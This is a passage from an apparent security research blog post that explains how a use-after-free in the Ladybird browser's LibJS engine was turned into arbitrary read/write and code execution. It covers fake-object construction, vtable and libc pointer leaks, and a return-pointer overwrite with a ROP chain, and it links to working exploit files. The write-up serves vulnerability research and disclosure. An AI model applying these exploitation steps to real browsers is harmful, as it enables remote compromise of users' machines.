</span></span><span><span>                    <span>return</span> <span>static_cast</span><span>&lt;</span>SimpleIndexedPropertyStorage <span>const</span><span>*&gt;</span>(object_storage)<span>-&gt;</span>inline_get(index);
</span></span><span><span>                <span>else</span>
</span></span><span><span>                    <span>return</span> <span>static_cast</span><span>&lt;</span>GenericIndexedPropertyStorage <span>const</span><span>*&gt;</span>(object_storage)<span>-&gt;</span>get(index);
</span></span><span><span>            }();
</span></span><span><span>            <span>if</span> (maybe_value.has_value()) {
</span></span><span><span>                <span>auto</span> value <span>=</span> maybe_value<span>-&gt;</span>value;
</span></span><span><span>                <span>if</span> (<span>!</span>value.is_accessor())
</span></span><span><span>                    <span>return</span> value;
</span></span><span><span>            }
</span></span><span><span>        }
</span></span><span><span>        
</span></span><span><span>        <span>// try some further optimizations, otherwise fallback to a generic `internal_get`
</span></span></span><span><span><span></span>        ...
</span></span></code></pre></div><p>Furthermore if the storage type is <code>SimpleIndexedPropertyStorage</code> then the following method is used.</p><div><pre tabindex="0"><code data-lang="cpp"><span><span><span>[[nodiscard]]</span> Optional<span>&lt;</span>ValueAndAttributes<span>&gt;</span> inline_get(u32 index) <span>const</span>
</span></span><span><span>{
</span></span><span><span>    <span>if</span> (<span>!</span>inline_has_index(index))
</span></span><span><span>        <span>return</span> {};
</span></span><span><span>    <span>return</span> ValueAndAttributes { m_packed_elements.data()[index], default_attributes };
</span></span><span><span>}
</span></span></code></pre></div><p>This indexes into the <code>m_packed_elements</code> vector using our offset. This code path (indexing into an array-like object
that has a <code>SimpleIndexedPropertyStorage</code>) contains no virtual function calls, meaning we donâ€™t need to give our fake
object a vtable pointer â€” which is useful, in that we donâ€™t need to know where one is.</p><p>We set up our fake object such that <code>m_indexed_properties</code> points to a fake
<code>SimpleIndexedPropertyStorage</code> object, whose <code>m_packed_elements</code> then points to the location of the read.
This is simpler than it sounds, as all these structures can be overlapped in the same memory region.</p><p><img src="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/ladybird-uaf-graph.png" alt="Diagram of object layout"/></p><p>Now that we have the structures laid out in memory, all thatâ€™s left is ensuring:</p><ul><li>[2] passes: by setting <code>m_may_interfere_with_indexed_property_access</code> to <code>false</code></li><li>and [3] passes: by setting <code>m_is_simple_storage</code> on the object storage to <code>true</code></li></ul><p>After we have a reliable read capability, we can leak the vtable for <code>SimpleIndexedPropertyStorage</code>,
then patch our fake storage object. This gives us a write capability by doing the opposite process to the
read, without crashing.</p><h2 id="code-execution">Code Execution</h2><p>Once we have an arbitrary read/write, we have complete control over the renderer:</p><ul><li>We can mess with internal values in the renderer,</li><li>We can craft a fake vtable to gain control flow after a stack pivot,</li><li>We can overwrite stack return pointers and construct a ROP chain.</li></ul><p>The most reliable method for getting code execution appears to be overwriting a return pointer.</p><p>First, we leak the location of the stack by following a chain of pointers around the address space.
The chain begins with a pointer into the LibJS mapping (the vtable pointer of our object). From there,
we leak a GOT entry taking us to libc, where we finally leak a pointer to the stack (via <code>__libc_argv</code>).</p><p>Once weâ€™ve found the stack, we search for a specific return pointer (<code>__libc_start_call_main</code>)
and overwrite it with a ROP chain. The POC ROP chain is simple; it <code>execve</code>â€™s <code>/calc</code>
(<a href="https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls#x86_64-64-bit">syscall <code>0x3b</code></a>),
which is a symbolic link to the calculator app. A more complex payload would map RWX pages for a second
stage.</p><p>All thatâ€™s left is to close the tab, which will collapse the stack and trigger the ROP chain.</p><p><a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/uaf-browser.zip">This</a> is the final exploit code for the browser, and <a href="https://jessie.cafe/posts/pwning-ladybirds-libjs/files/uaf-shell.js">this</a> is
the exploit for the REPL. Both working on <code>b8fa355a21</code> â€” x86_64-linux</p><p>Below is a video of the final exploit!</p><video controls="">
<source src="files/ladybird-uaf.mp4" type="video/mp4"/></video></div></div>
  </body>
</html>
